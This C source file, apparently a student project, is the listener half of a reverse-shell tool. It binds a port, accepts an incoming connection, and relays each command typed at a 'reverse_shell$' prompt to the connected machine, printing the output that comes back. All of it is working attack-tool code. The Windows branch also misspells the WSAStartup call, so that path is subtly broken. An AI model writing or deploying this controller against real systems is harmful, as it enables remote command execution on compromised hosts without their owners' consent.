#include "reverse_shell.h"
#include "libft.h"

int	error(char *message, int exit_code)
{
	int	message_len;

	message_len = strlen(message);
	write(2, message, message_len);
	write(2, "\n", 1);
	return (exit_code);
}

int	create_server(SOCKET *fd, SOCKET *client_fd)
{
	int 				opt;
	socklen_t			addr_len;
	struct sockaddr_in addr;

	*fd = socket(AF_INET, SOCK_STREAM, 0);
	if (!ISVALIDSOCKET(*fd))
		return (error("Failed opening socket", 1));
	opt = 1;
	addr_len = sizeof(addr);
	if (setsockopt(*fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) != 0)
	{
		CLOSESOCKET(*fd);
		return (error("failed setting socket options", 1));
	}
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(PORT);
	if (bind(*fd, (struct sockaddr *)&addr, addr_len) < 0)
	{
		CLOSESOCKET(*fd);
		return (error("Could no bind to address", 1));
	}
	write(1, "Waiting for connection...\n", 26);
	if (listen(*fd, 3) < 0)
	{
		CLOSESOCKET(*fd);
		return (error("Failed to listen for connections", 1));
	}
	*client_fd = accept(*fd, (struct sockaddr *)&addr, &addr_len);
	if (!ISVALIDSOCKET(*client_fd))
	{
		CLOSESOCKET(*fd);
		return (error("Failed accepting the connection", 1));
	}
	write(1, "Connected!\n\n", 12);
	return (0);
}

int	disable_blocking_mode(int socket_fd)
{
	#if defined(_WIN32)
		u_long	mode;
		
		mode = 1;
		return (ioctlsocket(socket_fd, FIONBIO, &mode));
	#else
		int	fd_flags;

		fd_flags = fcntl(socket_fd, F_GETFL, 0);
		fd_flags |= O_NONBLOCK;
		return (fcntl(socket_fd, F_SETFL, fd_flags));
	#endif
}

int	main(void)
{
	SOCKET	server_fd;
	SOCKET	client_fd;
	char 	*line;

	#if defined(_WIN32)
		WSADATA	d;
		if (WSAStarup(MAKEWORD(2, 2), &d))
			return (1);
	#endif

	if (create_server(&server_fd, &client_fd) != 0)
		return (1);
	if (disable_blocking_mode(client_fd) != 0)
		return (CLOSESOCKET(server_fd), CLOSESOCKET(client_fd), 1);
	line = 0;
	while (1)
	{
		write(1, RED, 7);
		write(1, "reverse_shell$ ", 15);
		write(1, RESET, 4);
		if (ft_getline(&line, 0) <= 0)
			break ;
		write(client_fd, line, strlen(line));
		usleep(500000);
		while (ft_getline(&line, client_fd) > 0)
			write(1, line, strlen(line));
	}
	CLOSESOCKET(server_fd);
	CLOSESOCKET(client_fd);
	#if defined(_WIN32)
		WSACleanup();
	#endif
	return (0);
}
